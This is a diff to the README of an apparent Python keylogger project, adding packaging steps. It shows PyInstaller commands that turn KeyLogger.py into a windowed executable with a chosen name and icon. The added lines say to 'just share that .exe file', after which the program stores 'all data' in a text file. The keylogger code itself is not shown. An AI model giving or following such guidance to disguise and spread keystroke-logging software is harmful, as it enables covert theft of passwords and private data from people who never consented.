@@ -5,3 +5,7 @@ python -m PyInstaller --onefile --windowed KeyLogger.py
 
 This command is used to change the name and the icon of the .exe file
 python -m PyInstaller --onefile --windowed --name="NewName" --icon="icon.ico" KeyLogger.py
+
+After the exceution of the following command this will create a dist Directory containing the exccutable file.
+
+just share that .exe file. After the programs run sucessfully this will give you a .txt file which store the all data.
